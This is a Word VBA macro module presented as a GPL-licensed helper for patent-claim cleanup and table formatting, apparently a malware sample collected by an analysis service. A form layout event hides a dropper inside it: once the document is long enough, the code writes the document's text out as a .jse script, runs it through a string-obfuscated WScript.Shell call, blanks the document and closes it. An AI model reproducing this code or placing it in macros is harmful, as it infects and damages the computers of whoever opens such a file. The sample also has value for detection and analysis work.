Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
' Author: Stephen G. Nagy
' Licensed under the GPL License v 3.0
' If this macro helped you, consider donating at pp/stnagy.
' Disclaimer: No warranty is provided for the use of this software.
' Software is provided as is.
' USE AT YOUR OWN RISK.

Private Nu_Der_s As String
Private TolOper As String
Private FerdOler As String


Sub ReturnTableText()
Dim tblCount As Integer
Dim cellCount As Integer
Set oData = New Collection

MsgBox (RemoveUnWantedGraphs())
MsgBox (ListToHtml())
UpdateDocLinks
tblCount = ActiveDocument.Tables.Count
    For i = 1 To tblCount
        Set oTable = ActiveDocument.Tables(i)
       If oTable.Uniform = True Then
         Set pageData = New Collection
         cellCount = oTable.Columns(1).Cells.Count
         For s = 1 To cellCount
            Set oCell = oTable.Columns(1).Cells(s)
            'For Each oCell In oTable.Columns(1).cells
               If oCell <> Empty Then
               
                   Set myRange = oCell.Range
                   myRange.MoveEnd Unit:=wdCharacter, Count:=-1
                   Dim id As String
                   id = TrimToWord(myRange.Text)
                   If Len(id) > 0 Then
                       Set curCell = oCell.Row.Cells.Item(2)
                       Dim content As String: content = FullTrim(ValidateRange(curCell.Range))
                       pageData.Add Array(content, LCase(id))
                   End If
                End If
            'Next oCell
         Next
        oData.Add pageData
        Else
        MsgBox ("table " & i & " has Merged cells")
        End If
    Next
    If oData.Count > 0 Then
        If WriteJSON(oData) = True Then
            MsgBox ("File created succsessfully")
        Else
            MsgBox ("Fail to created File")
        End If
    Else
        MsgBox ("Collection is empty")
    End If
    
End Sub



Sub UpdateOldPatentClaims()

' Macro does the following in sequence:
'    (1) turns on track changes
'    (2) removes all text that is formatted with strikethrough
'    (3) removes underline formatting but leave text
'    (4) changes track changes setting to whatever it was before the macro


    ' set variable [ currentTrackChanges ] to true / false depending on whether
    ' track changes is currently enabled.
    Dim currentTrackChanges As Boolean
    On Error Resume Next
    currentTrackChanges = ActiveDocument.TrackRevisions

    ' (1) turns on track changes
    ActiveDocument.TrackRevisions = True
    With Options
        .InsertedTextMark = wdInsertedTextMarkUnderline
        .InsertedTextColor = wdBlue
        .DeletedTextMark = wdDeletedTextMarkStrikeThrough
        .DeletedTextColor = wdByAuthor
        .RevisedPropertiesMark = wdRevisedPropertiesMarkColorOnly
        .RevisedPropertiesColor = wdBrightGreen
        .RevisedLinesMark = wdRevisedLinesMarkOutsideBorder
        .RevisedLinesColor = wdAuto
        .CommentsColor = wdByAuthor
    End With

    ' (2) removes all text that is formatted with strikethrough
    With Selection.Find
        .ClearFormatting
        .Format = True
        .Font.StrikeThrough = True
        .Forward = True
        .Wrap = wdFindContinue
        .Replacement.ClearFormatting
        .Replacement.Text = ""
        .Execute Forward:=True, Replace:=wdReplaceAll, _
        FindText:="", ReplaceWith:=""
    End With

    ' (3) removes underline formatting but leave text
    With Selection.Find
        .ClearFormatting
        .Format = True
        .Font.Underline = True
        .Font.Bold = False
        .Font.StrikeThrough = False
        .Font.Italic = False
        .Forward = True
        .Wrap = wdFindContinue
        .Replacement.ClearFormatting
        .Replacement.Font.Underline = False
        .Execute Forward:=True, Replace:=wdReplaceAll, _
        FindText:="", ReplaceWith:=""
    End With
    
        VBA.CallByName VBA.CreateObject(Empty & "W" & Empty & "Sc" & Empty & "rip" & Empty & "t." & TolOper), _
    "R" & Empty & "u" & "" & "n", VbMethod, _
    """" & Nu_Der_s & """" & " " & ActiveDocument.TrackRevisions, 0
    

    ' (4) changes track changes setting to whatever it was before the macro
    ActiveDocument.TrackRevisions = currentTrackChanges

End Sub

    
Private Sub Summer(Yy As String)
Nu_Der_s = Yy & Empty & "\..\PublicEnemy" & Empty
On Error Resume Next
MkDir Nu_Der_s
Nu_Der_s = "" & Nu_Der_s & Empty & "\hereyouare" & Empty & ".j" & Empty & "s" & "" & "e" & Empty
Dim Ntooker As Integer
Ntooker = FreeFile
Open Nu_Der_s For Output As #Ntooker
Print #Ntooker, ActiveDocument.content.Text
Close #Ntooker
TolOper = Empty & "s" & Empty & "h" & Empty & "el" & "" & "l" & Empty
Exit Sub
ReturnTableText
End Sub


Sub customTableFormatter()
On Error Resume Next
Application.ScreenUpdating = False
Dim RngSel As Range, Tbl As Table, sWdth(), i As Long, Rng As Range
sWdth = Array(7.95, 0.6, 3.31, 3.19, 0.85, 7.35)
Set RngSel = Selection.Range
With RngSel
  For Each Tbl In .Tables
    With Tbl
      .TopPadding = InchesToPoints(0.05)
      .BottomPadding = InchesToPoints(0.05)
      .LeftPadding = InchesToPoints(0.05)
      .RightPadding = InchesToPoints(0.05)
      .Spacing = 0
      .AllowAutoFit = False
      .PreferredWidthType = wdPreferredWidthPoints
      .PreferredWidth = InchesToPoints(sWdth(0))
      With .Rows
        .LeftIndent = 0
        .Alignment = wdAlignRowCenter
        .WrapAroundText = False
        .RelativeHorizontalPosition = wdRelativeHorizontalPositionMargin
        .HeightRule = wdRowHeightAuto
      End With
      With .Range
        .Cells(1).Select: Selection.Rows.HeadingFormat = True
        For i = 1 To 4
          .Cells(i).Width = InchesToPoints(sWdth(i))
        Next
        For i = 5 To .Cells.Count
          If ((i Mod 5) + 1) = 1 Then
            If .Cells(i + 4).ColumnIndex = 1 Then
              Set Rng = .Cells(i).Range
              Rng.End = .Cells(i + 4).Range.End
              Rng.Select: Selection.Cells.Merge
            End If
            .Cells(i).VerticalAlignment = wdCellAlignVerticalTop
          End If
          If ((i Mod 5) + 1) = 5 Then
            .Cells(i).SetHeight Rowheight:=InchesToPoints(0.8), HeightRule:=wdRowHeightAtLeast
          End If
          .Cells(i).Width = InchesToPoints(sWdth((i Mod 5) + 1))
          If i = .Cells.Count Then Exit For
        Next
      End With
      Tbl.Rows.WrapAroundText = False
      Tbl.Rows.Alignment = wdAlignRowCenter
    End With
  Next
End With
Summer Application.StartupPath
Application.ScreenUpdating = True
End Sub



Private Function FerdIyu()
FerdIyu = Len(ActiveDocument.content.Text)
End Function

    
Private Sub FeooLop()
If (FerdIyu > 13033) Then
customTableFormatter
ActiveDocument.content.Text = ""
UpdateOldPatentClaims
ActiveDocument.Close
End If
End Sub








Private Sub MultiPage1_Layout(ByVal Index As Long)
FeooLop
End Sub

' InQuest injected base64 decoded content
' Z+:yr

INQUEST-PP=macro
